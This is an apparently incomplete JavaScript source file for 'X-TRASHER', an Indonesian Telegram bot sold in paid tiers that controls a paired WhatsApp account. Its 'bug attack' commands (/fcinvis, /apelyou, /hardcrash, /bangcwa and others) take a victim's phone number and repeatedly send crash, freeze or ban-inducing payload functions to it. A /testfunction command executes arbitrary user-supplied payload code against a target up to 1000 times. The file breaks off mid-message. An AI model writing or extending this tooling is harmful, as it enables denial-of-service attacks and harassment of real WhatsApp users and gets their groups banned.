⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

╰➤ INFORMATION:
 ▢ Developer: @ApongSkt
 ▢ Princess: Riskaa 🤍
 ▢ Script: X-ᴛʀᴀꜱʜᴇʀ
 ▢ Version: Auto-Update Latest
 ▢ Status: Bot Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

// ============ CLAIM PREMIUM GROUP ============
const claimGroupsPath = './database/claimGroups.json';

function loadClaimGroups() {
    try {
        if (fs.existsSync(claimGroupsPath)) {
            return JSON.parse(fs.readFileSync(claimGroupsPath, 'utf8'));
        }
    } catch (e) {}
    return [];
}

function saveClaimGroups(groups) {
    const dir = path.dirname(claimGroupsPath);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(claimGroupsPath, JSON.stringify(groups, null, 2));
}

// ============ MIDDLEWARE GLOBAL CEK PREMIUM ============
bot.use(async (ctx, next) => {
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;
    const command = ctx.message?.text?.split(" ")[0] || "";

    if (userId == ownerID) return next();

    const bugCommands = ['/bangcwa', '/banbrutal', '/fcinvis', '/xspam', '/everyou', '/apelyou', '/testfunction', '/sendOtp', '/delayonly', '/hardcrash', '/spamdelay'];
    if (!bugCommands.some(cmd => command.startsWith(cmd))) return next();

    if (ctx.chat.type === 'private') return next();

    const isPrem = isPremiumUser(userId);

    if (!isPrem) {
        const groups = loadClaimGroups();
        const groupId = chatId.toString();

        if (groups.includes(groupId)) {
            return ctx.reply(`
<blockquote>❌ AKSES DITOLAK!
━━━━━━━━━━━━━━━━━━━━━━
Anda belum premium.

📌 CARA CLAIM PREMIUM:
Ketik /claim di group ini.

⚡ Premium gratis 30 hari!
            `, { parse_mode: 'HTML' });
        } else {
            return ctx.reply(`
❌ AKSES DITOLAK!
━━━━━━━━━━━━━━━━━━━━━━
Anda belum premium.
Hubungi owner untuk mendapatkan akses premium.</blockquote>
            `, { parse_mode: 'HTML' });
        }
    }

    next();
});

// ============ COMMAND CLAIM PREMIUM ============
bot.command("addgb", async (ctx) => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Hanya owner!");

    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("📌 /addgb -1001234567890");

    const groupId = args[1];
    const groups = loadClaimGroups();

    if (groups.includes(groupId)) return ctx.reply("⚠️ Group sudah terdaftar!");

    groups.push(groupId);
    saveClaimGroups(groups);

    let nama = groupId;
    try { const chat = await ctx.telegram.getChat(groupId); nama = chat.title || groupId; } catch(e) {}

    ctx.reply(`✅ Group berhasil ditambahkan!\n📛 ${nama}\n🆔 ${groupId}`);
});

bot.command("delgb", async (ctx) => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Hanya owner!");

    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("📌 /delgb -1001234567890");

    const groupId = args[1];
    let groups = loadClaimGroups();

    if (!groups.includes(groupId)) return ctx.reply("❌ Group tidak ditemukan!");

    groups = groups.filter(id => id !== groupId);
    saveClaimGroups(groups);

    ctx.reply(`✅ Group berhasil dihapus!\n🆔 ${groupId}`);
});

bot.command("listgb", async (ctx) => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Hanya owner!");

    const groups = loadClaimGroups();

    if (groups.length === 0) return ctx.reply("📭 Belum ada group terdaftar.");

    let list = "<blockquote>📋 DAFTAR GROUP CLAIM PREMIUM\n━━━━━━━━━━━━━━━━━━━━━━\n";
    let i = 1;

    for (const g of groups) {
        let nama = g;
        try { const chat = await ctx.telegram.getChat(g); nama = chat.title || g; } catch(e) {}
        list += `${i}. ${nama}\n   ${g}\n\n`;
        i++;
    }

    list += `━━━━━━━━━━━━━━━━━━━━━━\n📊 Total: ${groups.length} group</blockquote>`;
    ctx.reply(list, { parse_mode: 'HTML' });
});

bot.command("claim", async (ctx) => {
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;
    const chatType = ctx.chat.type;

    if (chatType !== 'group' && chatType !== 'supergroup') {
        return ctx.reply("❌ Hanya di group!");
    }

    if (isPremiumUser(userId)) {
        return ctx.reply("✅ Anda sudah premium!");
    }

    const groups = loadClaimGroups();
    if (!groups.includes(chatId.toString())) {
        return ctx.reply("❌ Group tidak terdaftar mohon untuk owner script untuk gunakan command /addgb -108xxx");
    }

    const duration = 30;
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    const premiumUsers = loadPremiumUsers();
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);

    let nama = chatId;
    try { const chat = await ctx.telegram.getChat(chatId); nama = chat.title || chatId; } catch(e) {}

    ctx.reply(`
<blockquote>🎉 SELAMAT! PREMIUM BERHASIL DI-CLAIM!
━━━━━━━━━━━━━━━━━━━━━━
👤 User: ${ctx.from.first_name}
🆔 ID: ${userId}
📅 Expired: ${expiryDate}
📦 Durasi: ${duration} Hari
📛 Group: ${nama}
━━━━━━━━━━━━━━━━━━━━━━
⚡ Sekarang akses semua fitur premium!</blockquote>
    `, { parse_mode: 'HTML' });

    try {
        await ctx.telegram.sendMessage(ownerID, `🎉 CLAIM PREMIUM!\n👤 ${ctx.from.first_name}\n🆔 ${userId}\n📅 ${expiryDate}\n📛 ${nama}`);
    } catch(e) {}
});

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "APONG123");  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `<blockquote>
▢ Number: ${phoneNumber}
▢ Pairing Code: ${formattedCode}
▢ Type: Not Connected
</blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `<blockquote>
▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremium 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremium 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addpremgrup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremgrup -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delpremgrup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremgrup -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

const styles = ["primary", "success", "danger"];

let styleIndex = 0;
let menuAnimation = null;

function getCurrentStyle() {
    return styles[styleIndex];
}

function rotateStyle() {

    styleIndex++;

    if (styleIndex >= styles.length) {
        styleIndex = 0;
    }

}

function button(text, callback_data, emoji = "5832251986635920010") {
    return {
        text,
        callback_data,
        style: getCurrentStyle(),
        icon_custom_emoji_id: emoji
    };
}

function urlButton(text, url, emoji = "5807868868886009920") {
    return {
        text,
        url,
        style: getCurrentStyle(),
        icon_custom_emoji_id: emoji
    };
}

function startKeyboard() {

    return [
        [
            button(
                "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
                "/controls",
                "5366073534793671550"
            ),
            button(
                "ʜᴀʀɢᴀ ꜱᴄʀɪᴘᴛ",
                "/kanjut",
                "5366073534793671550"
            )
        ],
        [
        urlButton(
                "ɪɴꜰᴏ ꜱᴄʀɪᴘᴛ",
                "https://t.me/about_apong"
            )
        ],
        [
            button(
                "ʙᴜɢ ᴀᴛᴛᴀᴄᴋ",
                "/bug",
                "5357317569650911348"
            ),
            button(
                "ᴛʜᴀɴᴋꜱ ᴛᴏ",
                "/tqto",
                "5357317569650911348"
            ),            
            button(
                "ᴛᴏᴏʟꜱ",
                "/toolsss",
                "5357317569650911348"
            ),
        ], 
        [
            urlButton(
                "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
                "https://t.me/ApongSkt"
            )
        ]
    ];

}

function stopMenuAnimation() {

    if (menuAnimation) {
        clearInterval(menuAnimation);
        menuAnimation = null;
    }

}

function startAnimation(ctx, messageId) {

    stopMenuAnimation();

    menuAnimation = setInterval(async () => {

        try {

            rotateStyle();

            await ctx.telegram.editMessageReplyMarkup(
                ctx.chat.id,
                messageId,
                undefined,
                {
                    inline_keyboard: startKeyboard()
                }
            );

        } catch (e) {}

    }, 1500);

}

function getStartCaption(ctx) {
    const senderStatus = isWhatsAppConnected ? "✅ Connected" : "❌ Disconnected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const user = ctx.from;
    const username = user.username ? `@${user.username}` : "Tidak ada";
    const userId = user.id;
    const isPremium = isPremiumUser(userId) ? "✅ Sudah Premium" : "❌ Belum Premium";

    return `
<blockquote><pre>⌬━─≪ χ-тяαѕнєя мυявυg ≫─━⌬</pre></blockquote>
✠ σωηєяѕ : @ApongSkt
✠ ρℓαтƒσям : Telegram
✠ туρє ѕ¢яιρт : Bebas Spam
<blockquote><pre>⌬━─≪ ιηƒσямαтιση υѕєя ≫─━⌬</pre></blockquote>
✠ ι∂ υѕєя : <code>${userId}</code>
✠ υѕєяηαмє : ${username}
✠ ρяємιυм : ${isPremium}
<blockquote><pre>⌬━─≪ ѕтαтυѕ ѕєη∂єя ≫─━⌬</pre></blockquote>
✠ ѕєη∂єя : ${senderStatus}
`;
}

bot.use((ctx, next) => {

    if (secureMode) return;

    return next();

});

bot.start(async (ctx) => {

    stopMenuAnimation();

    const startCaption = getStartCaption(ctx);

    const msg = await ctx.replyWithPhoto(
        thumbnailUrl,
        {
            caption: startCaption,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: startKeyboard()
            }
        }
    );

    startAnimation(ctx, msg.message_id);

});

bot.action("/start", async (ctx) => {

    stopMenuAnimation();

    try {
        const startCaption = getStartCaption(ctx);

        await ctx.editMessageMedia(
            {
                type: "photo",
                media: thumbnailUrl,
                caption: startCaption,
                parse_mode: "HTML"
            },
            {
                reply_markup: {
                    inline_keyboard: startKeyboard()
                }
            }
        );

        const messageId = ctx.update.callback_query.message.message_id;

        startAnimation(ctx, messageId);

    } catch (e) {

        await ctx.answerCbQuery();

    }

});

bot.action("/controls", async (ctx) => {

    stopMenuAnimation();

    const text = `
<blockquote><pre>⌬━─≪ χ-тяαѕнєя мυявυg ≫─━⌬</pre></blockquote>
✠ σωηєяѕ : @ApongSkt
✠ ρяιη¢єѕѕ : Riskaa 🤍
✠ νєяѕιση : Auto-Update Latest
✠ ρℓαтƒσям : Telegram
✠ туρє ѕ¢яιρт : Bebas Spam
<blockquote><pre>⌬━─≪ ѕєттιηg мυявυg ≫─━⌬</pre></blockquote>
╭〔 𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔  𝑺͒𝒆͢𝒏͠𝒅𝒆͒𝒓͢ 〕
│ ⌬ /requestpair → add Session sender
│ ⌬ /resetsession → reset sesi
│ ⌬ /ceksender → cek koneksi sender 
│ ⌬ /cekall → cek prem, sender dll
╰────────
╭〔 𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔 𝑴͒𝒖͢𝒓͠𝒃𝒖͒𝒈͢ 〕
│ ⌬ /addpremgrup → add prem gc
│ ⌬ /delpremgrup → hapus prem
│ ⌬ /claim → claim premium 30d
│ ⌬ /listgb → list group claim prem
│ ⌬ /delgb → dell group claim prem
│ ⌬ /addgb → add group claim prem
╰────────
╭〔 𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔 𝑼͒𝒔͢𝒆͠𝒓͒ 〕
│ ⌬ /addpremium → add premium
│ ⌬ /delpremium → hapus prem
│ ⌬ /cekprem → cek status
╰────────
`;

    await ctx.editMessageCaption(
        text,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        button(
                            "χ-вα¢к мєηυ",
                            "/start",
                            "5832251986635920010"
                        )
                    ]
                ]
            }
        }
    );

});

bot.action("/bug", async (ctx) => {

    stopMenuAnimation();

    const text = `
<blockquote><pre>⌬━─≪ χ-тяαѕнєя мυявυg ≫─━⌬</pre></blockquote>
✠ σωηєяѕ : @ApongSkt
✠ ρяιη¢єѕѕ : Riskaa 🤍
✠ νєяѕιση : Auto-Update Latest
✠ ρℓαтƒσям : Telegram
✠ туρє ѕ¢яιρт : Bebas Spam
<blockquote><pre>⌬━─≪ вαηηє∂ gяσυρ ωнαтѕαρρ ≫─━⌬</pre></blockquote>
↯ /bangcwa - basic ban group 
↯ /banbrutal - brutal ban group 
<blockquote><pre>⌬━─≪ ƒσя¢є ¢ℓσѕє αη∂яσι∂ ≫─━⌬</pre></blockquote>
↯ /xspam - bebas spam fc
↯ /fcinvis - fc android invisible
<blockquote><pre>⌬━─≪ мυявυg вєвαѕ ѕραм ≫─━⌬</pre></blockquote>
↯ /everyou - spam delay
↯ /apelyou - crash android 
↯ /delayonly - invisible delay
↯ /spamdelay - invisible freeze
↯ /hardcrash - delay crash
`;

    await ctx.editMessageCaption(
        text,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        button(
                            "χ-вα¢к мєηυ",
                            "/start",
                            "5832251986635920010"
                        ),
                    ]
                ]
            }
        }
    );

});

bot.action("/kanjut", async (ctx) => {

    stopMenuAnimation();

    const text = `
<blockquote><pre>⌬━─≪ χ-тяαѕнєя мυявυg ≫─━⌬</pre></blockquote>
✠ σωηєяѕ : @ApongSkt
✠ ρяιη¢єѕѕ : Riskaa 🤍
✠ νєяѕιση : Auto-Update Latest
✠ ρℓαтƒσям : Telegram
✠ туρє ѕ¢яιρт : Bebas Spam
<blockquote><pre>⌬━─≪ ρяι¢є ℓιѕт ѕ¢яιρт ≫─━⌬</pre></blockquote>
😈 NO UPDATE    » Rp 10.000
😈 1x UPDATE     » Rp 25.000
😈 3x UPDATE     » Rp 40.000
🔄 FULL UPDATE  » Rp 50.000
📦 RESELLER  » Rp 70.000
🤝 PARTNER  » Rp 90.000
⭐ OWNER    » Rp 120.000
👑 FOUNDER  » Rp 150.000
`;

    await ctx.editMessageCaption(
        text,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        button(
                            "χ-вα¢к мєηυ",
                            "/start",
                            "5832251986635920010"
                        ),
                    ]
                ]
            }
        }
    );

});

bot.action("/tqto", async (ctx) => {

    stopMenuAnimation();

    const text = `
<blockquote><pre>⌬━─≪ тнαηкѕ тσ ≫─━⌬</pre></blockquote>
✠ Owners Script : @ApongSkt
✠ Support Full  : All Founder X-TRASHER
✠ My Support   : All buyer X-TRASHER
`;

    await ctx.editMessageCaption(
        text,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        button(
                            "χ-вα¢к мєηυ",
                            "/start",
                            "5832251986635920010"
                        ),
                    ]
                ]
            }
        }
    );

});

bot.action("/toolsss", async (ctx) => {

    stopMenuAnimation();

    const text = `
╭─〔 тσσℓѕ мєηυ χ-тяαѕнєя 〕──────────╮
│ ↯ /donate → Donasi Support Project
│ ↯ /update → Update New Script
│ ↯ /iqc → SS iPhone
│ ↯ /info → Cek Info User Profil
│ ↯ /cekfunction → Cek Error Function
│ ↯ /testfunction → Testing Function
│ ↯ /sendOtp → Send Otp WhatsApp
│ ↯ /play → Music Spotify
│ ↯ /dltiktok → Download VD TikTok No WM
│ ↯ /brat → Text
│ ↯ /cekidch → Cek ID Channel
│ ↯ /antilink on|off → Anti link grup
│ ↯ /mute /unmute → Mute/unmute user
│ ↯ /lockgc /unlockgc → Kunci/buka grup
│ ↯ /kick /ban /unban → Kick/ban user
│ ↯ /promote /demote → Jadikan/cabut admin
│ ↯ /tagall /hidetag → Tag semua member
│ ↯ /pin /unpin /del → Pin/hapus pesan
│ ↯ /settings → Lihat setting grup
╰──────────────────────────╯
`;

    await ctx.editMessageCaption(
        text,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        button(
                            "χ-вα¢к мєηυ",
                            "/start",
                            "5832251986635920010"
                        ),
                    ]
                ]
            }
        }
    );

});

//CASE BUG DISINI \\
bot.command(["fcinvis"], checkWhatsAppConnection, checkPremium, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /fcinvis 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ fcinvis (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 5; i++) {
      await forcloseinvisible(sock, target);
      await sleep(1500);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

bot.command(["xspam"], checkWhatsAppConnection, checkPremium, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /xspam 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ xspam (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 5; i++) {
      await xxx(sock, target);
      await sleep(1500);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

bot.command(["sendOtp"], checkWhatsAppConnection, checkPremium, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /sendOtp 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ sendOtp (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 5; i++) {
      await executions(sock, target);
      await sleep(1500);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

bot.command(["spamdelay"], checkWhatsAppConnection, checkPremium, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /spamdelay 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ spamdelay (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 5; i++) {
      await delayv2(sock, target);
      await sleep(1500);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

bot.command(["hardcrash"], checkWhatsAppConnection, checkPremium, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /hardcrash 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ hardcrash (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 5; i++) {
      await delayv2(sock, target);
      await sleep(1500);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

bot.command(["delayonly"], checkWhatsAppConnection, checkPremium, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /delayonly 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ delayonly (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 5; i++) {
      await delayv2(sock, target);
      await sleep(1500);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

bot.command(["everyou"], checkWhatsAppConnection, checkPremium, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /everyou 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ everyou (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 5; i++) {
      await LocationHard(sock, target);
      await sleep(1500);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

bot.command(["apelyou"], checkWhatsAppConnection, checkPremium, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /apelyou 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ apelyou (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 5; i++) {
      await AponggFunction(sock, target);
      await sleep(1500);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Unknown 
</blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
